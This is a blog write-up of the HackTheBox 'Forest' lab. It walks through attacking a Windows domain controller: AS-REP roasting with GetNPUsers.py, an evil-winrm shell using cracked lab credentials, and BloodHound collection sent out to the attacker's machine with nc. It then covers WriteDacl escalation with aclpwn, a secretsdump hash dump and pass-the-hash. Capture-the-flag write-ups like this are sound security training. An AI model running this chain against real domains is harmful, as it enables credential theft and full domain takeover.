---
title: "HackTheBox: Forest"
date: "2020-03-21"
author: frosty
categories:
  - "writeups"
tags:
  - "hackthebox"
---

![Image](assets/img/writeups/hackthebox/forest/htb-forst.png)

* * *

## Host Enumeration

As usual, we begin with an nmap scan to view open ports on the host. In my limited experience, Windows hosts have many open ports. It seems that this remains true with Forest. The notable ports here are

- 53: Domain
- 88: Kerberos-sec
- 445: microsoft-ds

![Image](assets/img/writeups/hackthebox/forest/image-22.png)

#### Enumeration - Domain

I tried to perform a zone transfer using `dig` however, it was unsuccessful. Seems that this is a dead end.

```
$ dig -axfr 10.10.10.161
```

#### Enumeration - Samba

I used `enum4linux` which allows us to get a list of usernames. There were no notes for the accounts which could have revealed a password. However, a list of usernames is always a good start! I saved the usernames into a file.

![Image](assets/img/writeups/hackthebox/forest/image-23.png)

#### Enumeration - Kerberos-sec

At first I was unsure how this service could be exploited, however after some research I understood that this service is used to distribute the kerberos tickets to users. I searched the [impacket suite](https://github.com/SecureAuthCorp/impacket), and with some luck I saw the [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/8d4c91481b01dae9f62804893fcc74a40ffc7c45/examples/GetNPUsers.py) script, which attempts to get the ticket granting ticket (TGT) using a list of usernames. The TGT would be obtained for users which `Do not require Kerberos preauthentication`. The script automatically formats the TGT such that it could be brute-forced using `john` to obtain the plain-text password.

```
$ GetNPUsers.py htb.local/ -no-pass -usersfile ~/htb/Forest/user.txt
```

![Image](assets/img/writeups/hackthebox/forest/image-24.png)

![Image](assets/img/writeups/hackthebox/forest/image-25.png)

We now have user:pass credentials, however as there is no ssh port open, we cannot get a shell instantly.

* * *

## Getting user.txt

It is not seen in the nmap scan earlier - I suppose that the required port is not in the top-1000 ports - however, we are able to get a shell using `[evil-winrm](https://github.com/Hackplayers/evil-winrm)`; which operates by default on port 5985

```
$ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Then we got the user.txt flag!

* * *

## Escalating our Privileges

We need to escalate from local user to administrator level. We have to **let the dogs out** - a bloodhound reference. Let's use `[invoke-sharphound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)` to enumerate the host and the domain.

```
> powershell Import-Module .\SharpHound.ps1
> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
> cmd.exe /c ".\nc.exe 10.10.xx.xx 1234 < bloodhound.zip"
```

![Image](assets/img/writeups/hackthebox/forest/image-26.png)

![Image](assets/img/writeups/hackthebox/forest/image-27-1024x256.png)

Then, import the contents of the Zip file to Bloodhound application on Kali/Parrot, ensuring that the neo4j NoSQL database is running; otherwise this will not work.

We have to create a route from svc-alfresco \[our user shell\] to administrators level. To do this, we click the road icon at the top right of the query box \[top left of image\]. It looks something like this:

![Image](assets/img/writeups/hackthebox/forest/image-28-1024x759.png)

We see that the level before `HTB.LOCAL` is Exchange Windows Permissions, which is related through WriteDacl to `HTB.LOCAL`. I found [this blog post](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/) which shows how we can exploit this relationship. I assume that the exploit changes the permission of svc-alfresco user to be forest admin.

Rather than importing `invoke-aclpwn.ps1` to the target host, I used `[aclpwn.py](https://github.com/fox-it/aclpwn.py)` on my localhost.

- `-f` is who we are moving from, `-ft` is their level
- `-d` is the domain
- `-du` and `-dp` are the neo4j database username/password

> Note: The credentials in the screenshot below are fake

```
$ aclpwn -f svc-anfresco -ft user -d htb.local -du neo4j -dp aaaaa
```

![Image](assets/img/writeups/hackthebox/forest/image-29-1024x435.png)

After the aclpwn.py has changed svc-alfresco's permissions, we use `[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)` from the Impacket suite to dump the domain administrator hash.

![Image](assets/img/writeups/hackthebox/forest/image-30-1024x560.png)

Rather than trying to brute-force the password, I used the metasploit-framework pass the hash module to authenticate myself and get an administrator shell.

![Image](assets/img/writeups/hackthebox/forest/image-31-1024x434.png)

* * *

## Closing thoughts

This box has given me the opportunity to use Bloodhound for the first time, and additionally how it is possible to exploit the WriteDACL relationship. I learned a lot through this box, which I am happy about!
